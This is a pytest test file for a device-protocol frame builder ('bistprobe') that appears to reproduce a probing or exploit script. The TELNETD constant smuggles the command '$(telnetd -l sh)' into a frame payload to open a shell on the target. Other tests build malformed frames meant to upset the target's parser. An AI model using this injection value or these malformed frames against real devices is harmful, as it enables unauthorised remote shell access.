import pytest

from bistprobe.protocol import build_frame, checksum

TELNETD = b"test $(telnetd -l sh)"
PREFIX_HEX = "C0A8010A01"
LONGEST_PAYLOAD = 250  # one-byte length field minus the 5-byte prefix


# Frames produced by the original luke.py script.
@pytest.mark.parametrize(
    ("channel", "payload", "expected"),
    [
        (0, TELNETD, "EA0283111AC0A8010A017465737420242874656C6E657464202D6C207368293D"),
        (6, TELNETD, "EA6283111AC0A8010A017465737420242874656C6E657464202D6C2073682943"),
        (3, b"", "EA32831029"),
        (0, b"A" * LONGEST_PAYLOAD, f"EA028311FF{PREFIX_HEX}{'41' * LONGEST_PAYLOAD}51"),
    ],
)
def test_build_frame_matches_original(channel: int, payload: bytes, expected: str) -> None:
    assert build_frame(channel, 0x2831, payload) == expected.encode()


def test_checksum_sums_hex_digit_values_mod_256() -> None:
    assert checksum(b"0123456789ABCDEF") == 120  # noqa: PLR2004
    assert checksum(b"F" * 18) == (15 * 18) & 0xFF


def test_checksum_counts_non_hex_chars_by_code_point() -> None:
    # "Q" is not a hex digit; the target sums characters as ints.
    assert checksum(b"Q") == ord("Q")
    assert checksum(b"abc") == 10 + 11 + 12  # lowercase is still hex


def test_frame_ends_with_checksum_of_preceding_bytes() -> None:
    frame = build_frame(0xF, 0xFFFF, b"\x00\xff")
    assert frame[-2:] == f"{checksum(frame[:-2]):02X}".encode()


def test_non_hex_size_marker_builds_malformed_frame() -> None:
    # The original author's probe: invalid ASCII where the target parses the
    # payload size, expecting it to read 0xFF.
    frame = build_frame(0, 0x2831, b"X", size_marker="Q")
    assert frame == b"EA02831Q06C0A8010A0158B4"


@pytest.mark.parametrize("size_marker", ["", "12", "\u00e9"])
def test_size_marker_must_be_one_ascii_character(size_marker: str) -> None:
    with pytest.raises(ValueError, match="size_marker"):
        build_frame(0, 0x2831, b"X", size_marker=size_marker)


def test_out_of_range_channel_builds_malformed_frame() -> None:
    # Probing relies on this: the 2-digit channel shifts the following fields.
    assert build_frame(0x10, 0x2831) == b"EA102831027"
